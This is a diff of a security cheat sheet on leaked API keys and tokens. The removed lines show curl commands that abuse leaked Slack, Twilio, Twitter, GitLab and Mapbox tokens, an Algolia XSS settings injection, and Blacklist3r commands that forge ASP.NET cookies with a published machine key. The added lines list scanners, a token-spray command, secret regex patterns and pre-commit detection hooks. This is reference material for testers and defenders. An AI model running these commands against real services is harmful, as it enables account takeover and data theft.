@@ -1,141 +1,107 @@
-# API Key Leaks
+# API Key and Token Leaks
 
-> The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.
+> API keys and tokens are forms of authentication commonly used to manage permissions and access to both public and private services. Leaking these sensitive pieces of data can lead to unauthorized access, compromised security, and potential data breaches.
 
 ## Summary
 
 - [Tools](#tools)
-- [Exploit](#exploit)
-    - [Google Maps](#google-maps)
-    - [Algolia](#algolia)
-    - [AWS Access Key ID & Secret](#aws-access-key-id--secret)
-    - [Slack API Token](#slack-api-token)
-    - [Facebook Access Token](#facebook-access-token)
-    - [Github client id and client secret](#github-client-id-and-client-secret)
-    - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
-    - [Twitter API Secret](#twitter-api-secret)
-    - [Twitter Bearer Token](#twitter-bearer-token)
-    - [Gitlab Personal Access Token](#gitlab-personal-access-token)
-    - [HockeyApp API Token](#hockeyapp-api-token)
-    - [Auth Bypass using pre-published Machine Key](#auth-bypass-using-pre-published-machine-key)
-    - [Mapbox API Token](#Mapbox-API-Token)
-
+- [Methodology](#methodology)
+    - [Common Causes of Leaks](#common-causes-of-leaks)
+    - [Validate The API Key](#validate-the-api-key)
+- [Reducing The Attack Surface](#reducing-the-attack-surface)
+- [References](#references)
 
 ## Tools
 
-- [KeyFinder - is a tool that let you find keys while surfing the web!](https://github.com/momenbasel/KeyFinder)
-- [Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.](https://github.com/streaak/keyhacks)
+- [aquasecurity/trivy](https://github.com/aquasecurity/trivy) - General purpose vulnerability and misconfiguration scanner which also searches for API keys/secrets
+- [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets) - A library for detecting known or weak secrets on across many platforms
+- [d0ge/sign-saboteur](https://github.com/d0ge/sign-saboteur) - SignSaboteur is a Burp Suite extension for editing, signing, verifying various signed web tokens
+- [mazen160/secrets-patterns-db](https://github.com/mazen160/secrets-patterns-db) - Secrets Patterns DB: The largest open-source Database for detecting secrets, API keys, passwords, tokens, and more.
+- [momenbasel/KeyFinder](https://github.com/momenbasel/KeyFinder) - is a tool that let you find keys while surfing the web
+- [streaak/keyhacks](https://github.com/streaak/keyhacks) - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid
+- [trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog) - Find credentials all over the place
+- [projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) - Use these templates to test an API token against many API service endpoints
 
-## Exploit
+    ```powershell
+    nuclei -t token-spray/ -var token=token_list.txt
+    ```
 
-The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.
+## Methodology
 
-### Google Maps 
+- **API Keys**: Unique identifiers used to authenticate requests associated with your project or application.
+- **Tokens**: Security tokens (like OAuth tokens) that grant access to protected resources.
 
-Use : https://github.com/ozguralp/gmapsapiscanner/
+### Common Causes of Leaks
 
-Impact:
-* Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
-* Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account
+- **Hardcoding in Source Code**: Developers may unintentionally leave API keys or tokens directly in the source code.
 
-### Algolia 
+    ```py
+    # Example of hardcoded API key
+    api_key = "1234567890abcdef"
+    ```
 
-```powershell
-curl --request PUT \
-  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
-  --header 'content-type: application/json' \
-  --header 'x-algolia-api-key: <example-key>' \
-  --header 'x-algolia-application-id: <example-application-id>' \
-  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
+- **Public Repositories**: Accidentally committing sensitive keys and tokens to publicly accessible version control systems like GitHub.
+
+    ```ps1
+    ## Scan a Github Organization
+    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
+    
+    ## Scan a GitHub Repository, its Issues and Pull Requests
+    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
+    ```
+
+- **Hardcoding in Docker Images**: API keys and credentials might be hardcoded in Docker images hosted on DockerHub or private registries.
+
+    ```ps1
+    # Scan a Docker image for verified secrets
+    docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets
+    ```
+
+- **Logs and Debug Information**: Keys and tokens might be inadvertently logged or printed during debugging processes.
+
+- **Configuration Files**: Including keys and tokens in publicly accessible configuration files (e.g., .env files, config.json, settings.py, or .aws/credentials.).
+
+### Validate The API Key
+
+If assistance is needed in identifying the service that generated the token, [mazen160/secrets-patterns-db](https://github.com/mazen160/secrets-patterns-db) can be consulted. It is the largest open-source database for detecting secrets, API keys, passwords, tokens, and more. This database contains regex patterns for various secrets.
+
+```yaml
+patterns:
+  - pattern:
+      name: AWS API Gateway
+      regex: '[0-9a-z]+.execute-api.[0-9a-z._-]+.amazonaws.com'
+      confidence: low
+  - pattern:
+      name: AWS API Key
+      regex: AKIA[0-9A-Z]{16}
+      confidence: high
 ```
 
-### Slack API Token
+Use [streaak/keyhacks](https://github.com/streaak/keyhacks) or read the documentation of the service to find a quick way to verify the validity of an API key.
 
-```powershell
-curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
-```
+- **Example**: Telegram Bot API Token
 
-### Facebook Access Token
+    ```ps1
+    curl https://api.telegram.org/bot<TOKEN>/getMe
+    ```
 
-```powershell
-curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
-```
+## Reducing The Attack Surface
 
-### Github client id and client secret
+Check the existence of a private key or AWS credentials before commiting your changes in a GitHub repository.
 
-```powershell
-curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
-```
+Add these lines to your `.pre-commit-config.yaml` file.
 
-### Twilio Account_sid and Auth token
-
-```powershell
-curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
-```
-
-### Twitter API Secret
-
-```powershell
-curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
-```
-
-### Twitter Bearer Token
-
-```powershell
-curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
-```
-
-### Gitlab Personal Access Token
-
-```powershell
-curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
-```
-
-
-### HockeyApp API Token
-
-```powershell
-curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
-```
-
-
-### Auth Bypass using pre-published Machine Key
-
-> By default, ASP.NET creates a Forms Authentication Ticket with unique a username associated with it, Date and Time at which the ticket was issued and expires. So, all you need is just a unique username and a machine key to create a forms authentication token
-
-That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
-
-Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
-
-```xml
-<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
-```
-
-Exploit with [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)
-
-```powershell
-# decrypt cookie
-$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
-
-# encrypt cookie (edit Decrypted.txt)
-$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
-```
-
-
-### Mapbox API Token
-A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.
-```
-#Check token validity
-curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
-
-#Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)
-curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
+```yml
+-   repo: https://github.com/pre-commit/pre-commit-hooks
+    rev: v3.2.0
+    hooks:
+    -   id: detect-aws-credentials
+    -   id: detect-private-key
 ```
 
 ## References
 
-* [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
-* [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
-* [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
-* [Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
-* [Mapbox API Token Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/)
+- [Finding Hidden API Keys & How to Use Them - Sumit Jain - August 24, 2019](https://web.archive.org/web/20191012175520/https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
+- [Introducing SignSaboteur: Forge Signed Web Tokens with Ease - Zakhar Fedotkin - May 22, 2024](https://portswigger.net/research/introducing-signsaboteur-forge-signed-web-tokens-with-ease)
+- [Private API Key Leakage Due to Lack of Access Control - yox - August 8, 2018](https://hackerone.com/reports/376060)
+- [Saying Goodbye to My Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
